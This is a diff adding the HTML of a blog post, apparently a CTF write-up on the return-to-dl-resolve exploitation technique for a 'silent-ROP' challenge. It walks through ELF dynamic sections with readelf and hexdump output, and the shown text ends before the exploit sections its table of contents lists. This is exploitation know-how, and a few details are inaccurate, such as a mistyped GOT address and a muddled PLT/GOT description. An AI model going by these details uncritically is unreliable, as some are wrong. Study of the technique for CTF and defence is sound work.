@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x0 Introductionin th recent k3rn31ctf, there is a pwn question silent-ROP. In this challenge, there is no output, neither put or printf is imported. So there is no way we can get the libc address&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn - Return to dl-resolve Technique">
+<meta property="og:url" content="http://www.aynakeya.com/2021/11/19/ret2-dl-resolve-example-silent-rop/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="0x0 Introductionin th recent k3rn31ctf, there is a pwn question silent-ROP. In this challenge, there is no output, neither put or printf is imported. So there is no way we can get the libc address&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-18T20:31:58.000Z">
+<meta property="article:modified_time" content="2022-03-07T19:14:21.000Z">
+<meta property="article:author" content="Aynakeya">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="ret2dlresolve">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/2021/11/19/ret2-dl-resolve-example-silent-rop/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/2021/11/19/ret2-dl-resolve-example-silent-rop/","path":"2021/11/19/ret2-dl-resolve-example-silent-rop/","title":"Pwn - Return to dl-resolve Technique"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Pwn - Return to dl-resolve Technique | Aynakeya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-How-dl-resolve-works"><span class="nav-number">2.</span> <span class="nav-text">0x1 How dl resolve works.</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Which-part-are-used-in-dl-resolve"><span class="nav-number">2.1.</span> <span class="nav-text">Which part are used in dl resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SYMTAB-amp-STRTAB"><span class="nav-number">2.1.1.</span> <span class="nav-text">SYMTAB &amp; STRTAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JMPREL"><span class="nav-number">2.1.2.</span> <span class="nav-text">JMPREL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Process-of-dl-resolve"><span class="nav-number">2.2.</span> <span class="nav-text">Process of dl resolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Before-all"><span class="nav-number">2.2.1.</span> <span class="nav-text">Before all</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#before-call-dl-resolve"><span class="nav-number">2.2.2.</span> <span class="nav-text">before call dl resolve</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-resolve"><span class="nav-number">2.2.3.</span> <span class="nav-text">dl resolve</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-How-return-to-dl-resolve-work"><span class="nav-number">3.</span> <span class="nav-text">0x2 How return to dl-resolve work</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Example-Solution"><span class="nav-number">4.</span> <span class="nav-text">0x4 Example Solution</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-Example-Exploits"><span class="nav-number">5.</span> <span class="nav-text">0x5 Example Exploits</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-Flag"><span class="nav-number">6.</span> <span class="nav-text">0x6 Flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.aynakeya.com/2021/11/19/ret2-dl-resolve-example-silent-rop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/static/intro/images/avatar.jpg">
+      <meta itemprop="name" content="Aynakeya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aynakeya's Blog">
+      <meta itemprop="description" content="my blog~">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Pwn - Return to dl-resolve Technique | Aynakeya's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwn - Return to dl-resolve Technique
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-11-19 04:31:58" itemprop="dateCreated datePublished" datetime="2021-11-19T04:31:58+08:00">2021-11-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-08 03:14:21" itemprop="dateModified" datetime="2022-03-08T03:14:21+08:00">2022-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>in th recent k3rn31ctf, there is a pwn question <strong>silent-ROP</strong>.</p>
+<p>In this challenge, there is no output, neither put or printf is imported. So there is no way we can get the libc address&#x2F;version. Therefore, normal way of ret2libc didn&#39;t work in this case, because we can&#39;t get the address of <code>system</code> function.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">:&gt; ii</span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x08049070 GLOBAL FUNC       read</span><br><span class="line">2   0x00000000 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">3   0x08049080 GLOBAL FUNC       __libc_start_main</span><br><span class="line">4   0x00000000 GLOBAL OBJ        stdin</span><br><span class="line">5   0x08049090 GLOBAL FUNC       setvbuf</span><br><span class="line">6   0x00000000 GLOBAL OBJ        stdout</span><br></pre></td></tr></table></figure>
+
+<p>To solve this question, it required technique called <strong>ret2dlresolve</strong>, after serveral hour of reading article, i finally understand the process of return to dl resolve</p>
+<span id="more"></span>
+<p>here is some article I found useful</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">0ctf babystack with ret2dlresolve</a></li>
+<li><a target="_blank" rel="noopener" href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">ROP之return to dl-resolve</a></li>
+<li><a target="_blank" rel="noopener" href="https://ypl.coffee/dl-resolve/">how dl-resolve works</a></li>
+</ol>
+<h1 id="0x1-How-dl-resolve-works"><a href="#0x1-How-dl-resolve-works" class="headerlink" title="0x1 How dl resolve works."></a>0x1 How dl resolve works.</h1><p>to perfrom ret2dlresolve, first we need to know how how dl resolve works. The detailed explaination can be found in the third link (how dl-resolve works) in the Introduction.</p>
+<p>Take the silent-rop as example.</p>
+<h2 id="Which-part-are-used-in-dl-resolve"><a href="#Which-part-are-used-in-dl-resolve" class="headerlink" title="Which part are used in dl resolve"></a>Which part are used in dl resolve</h2><p>first take look at <strong>.dynamic</strong> section, the dynamic section contains some address that will be used in the dl resolve.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/k3rn3lctf2021/silent-rop$ readelf -d silent-ROP</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2f0c contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8049000</span><br><span class="line"> 0x0000000d (FINI)                       0x80492dc</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x804bf04</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x804bf08</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x8048228</span><br><span class="line"> 0x00000005 (STRTAB)                     0x80482c8</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x8048248</span><br><span class="line"> 0x0000000a (STRSZ)                      95 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804c000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048370</span><br><span class="line"> 0x00000011 (REL)                        0x8048358</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048338</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x8048328</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
+
+<p>There are 3 important segment <strong>JMPREL</strong>, <strong>STRTAB</strong> and <strong>SYMTAB</strong>.</p>
+<h3 id="SYMTAB-amp-STRTAB"><a href="#SYMTAB-amp-STRTAB" class="headerlink" title="SYMTAB &amp; STRTAB"></a>SYMTAB &amp; STRTAB</h3><p>first lets take look at SYMTAB and STRTAB, those two section are actually closely related.</p>
+<ul>
+<li><p>SYMTAB segment refer to <strong>section.dynsym</strong> (in this case 0x08048248)</p>
+</li>
+<li><p>STRTAB segment refer to <strong>section.dynstr</strong> (in this case 0x080482c8)</p>
+</li>
+</ul>
+<p>in elf sections, they are consecutive in adress</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0x08049235]&gt; iS</span><br><span class="line">[Sections]</span><br><span class="line">nth paddr        size vaddr       vsize perm name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">6   0x00000248   0x80 0x08048248   0x80 -r-- .dynsym</span><br><span class="line">7   0x000002c8   0x5f 0x080482c8   0x5f -r-- .dynstr</span><br></pre></td></tr></table></figure>
+
+<p>.dynstr is a simple list that store all the function name. as shown at 0x080482c8.</p>
+<p>.dynsym store the offset of function name in the .dynstr<br>and each <code>Elf32_Sym</code> struct have length of 0x10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct </span><br><span class="line">&#123; </span><br><span class="line">   Elf32_Word st_name ; /* Symbol name (string tbl index) */</span><br><span class="line">   Elf32_Addr st_value ; /* Symbol value */ </span><br><span class="line">   Elf32_Word st_size ; /* Symbol size */ </span><br><span class="line">   unsigned char st_info ; /* Symbol type and binding */ </span><br><span class="line">   unsigned char st_other ; /* Symbol visibility under glibc&gt;=2.2 */ </span><br><span class="line">   Elf32_Section st_shndx ; /* Section index */ </span><br><span class="line">&#125; Elf32_Sym ;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048248</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048248  0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br><span class="line">0x08048268  5000 0000 0000 0000 0000 0000 2000 0000  P........... ...</span><br><span class="line">0x08048278  3400 0000 0000 0000 0000 0000 1200 0000  4...............</span><br><span class="line">0x08048288  1a00 0000 0000 0000 0000 0000 1100 0000  ................</span><br><span class="line">0x08048298  2c00 0000 0000 0000 0000 0000 1200 0000  ,...............</span><br><span class="line">0x080482a8  2500 0000 0000 0000 0000 0000 1100 0000  %...............</span><br><span class="line">0x080482b8  0b00 0000 04a0 0408 0400 0000 1100 1100  ................</span><br><span class="line">0x080482c8  006c 6962 632e 736f 2e36 005f 494f 5f73  .libc.so.6._IO_s</span><br><span class="line">0x080482d8  7464 696e 5f75 7365 6400 7374 6469 6e00  tdin_used.stdin.</span><br><span class="line">0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span><br><span class="line">0x080482f8  6275 6600 5f5f 6c69 6263 5f73 7461 7274  buf.__libc_start</span><br><span class="line">0x08048308  5f6d 6169 6e00 474c 4942 435f 322e 3000  _main.GLIBC_2.0.</span><br><span class="line">0x08048318  5f5f 676d 6f6e 5f73 7461 7274 5f5f 0000  __gmon_start__..</span><br><span class="line">0x08048328  0000 0200 0000 0200 0200 0200 0200 0100  ................</span><br><span class="line">0x08048338  0100 0100 0100 0000 1000 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>
+
+<p>for example, lets take look at second Elf32_Sym struct in the .dynsym</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br></pre></td></tr></table></figure>
+<p>0x20 indicate the string offset in .dynstr. if we take look at .dynstr + 0x20, we can found the corresponding function name string &quot;read\x00&quot;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x080482c8+0x20</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span><br></pre></td></tr></table></figure>
+
+<h3 id="JMPREL"><a href="#JMPREL" class="headerlink" title="JMPREL"></a>JMPREL</h3><ul>
+<li>JMPREL refer to the <strong>section.rel.plt</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/k3rn3lctf2021/silent-rop$ readelf -r silent-ROP</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x370 contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804c00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804c010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804c014  00000507 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048370</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048370  0cc0 0408 0701 0000 10c0 0408 0703 0000  ................</span><br><span class="line">0x08048380  14c0 0408 0705 0000 0000 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>
+
+<p>the data structure of .rel.plt are very different in x86 and x64 system. In this case, we are looking at x32 binary. So, in x86 system, the struct of .rel.plt is <code>Elf32_Rel</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">  Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) #define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure>
+
+<p><code>r_offset</code> store the address of Global offset table of corresponding function.</p>
+<p><code>r_info</code> store the index address of <code>Elf32_Sym</code></p>
+<p>For example, the <code>read</code> function in .rel.plt have <code>r_offset</code> of 0x8040c00c, which is the address of <code>read</code> in GOT.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">;-- section..got.plt:</span><br><span class="line">;-- .got.plt:</span><br><span class="line">;-- _GLOBAL_OFFSET_TABLE_:</span><br><span class="line">0x0804c000      or al, 0xbf        ; 191 ; [24] -rw- section size 24 named .got.plt</span><br><span class="line">0x0804c002      add al, 8</span><br><span class="line">0x0804c004      add byte [eax], al</span><br><span class="line">0x0804c006      add byte [eax], al</span><br><span class="line">0x0804c008      add byte [eax], al</span><br><span class="line">0x0804c00a      add byte [eax], al</span><br><span class="line">;-- read:</span><br><span class="line">0x0804c00c      .dword 0x08049040  ; RELOC 32 read</span><br><span class="line">;-- __libc_start_main:</span><br><span class="line">0x0804c010      .dword 0x08049050  ; RELOC 32 __libc_start_main</span><br><span class="line">;-- setvbuf:</span><br><span class="line">0x0804c014      .dword 0x08049060  ; RELOC 32 setvbuf</span><br></pre></td></tr></table></figure>
+<p><code>r_info</code> is 0701 in this case, which indicate the sym index is 0x01.</p>
+<p>so, if we take look at <code>Elf32_Sym</code> struct at .dynsym + 0x01 * 0x10 (SYMTAB + index * length). </p>
+<p>as shown in the SYMTAB part, this indicate the function <code>read</code>. which is exactly what we want.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0x08049235]&gt; px @ 0x08048248 + 0x01*0x10</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span><br></pre></td></tr></table></figure>
+
+<h2 id="Process-of-dl-resolve"><a href="#Process-of-dl-resolve" class="headerlink" title="Process of dl resolve"></a>Process of dl resolve</h2><h3 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h3><p>Since dl resolve is called only when lazy binding is enabled. So dl resolve can only be called when the binary is <strong>Partial RELRO</strong> or <strong>No RELRO</strong></p>
+<p>If a binary is <strong>Full RELRO</strong>, this means dl resolve will not be called. Therefore, it is return to dl resolve will not work in Full RELRO binary</p>
+<h3 id="before-call-dl-resolve"><a href="#before-call-dl-resolve" class="headerlink" title="before call dl resolve"></a>before call dl resolve</h3><ol>
+<li>normally, if we want to call a funtion. we first call function address at PLT.</li>
+<li>if it is the first time call this function, the PLT will jump to GOT, push the real function address and jump back to plt, save the real function address to PLT for next call and then call the fucntion</li>
+<li>if there is already a address in PLT, it just call the function</li>
+</ol>
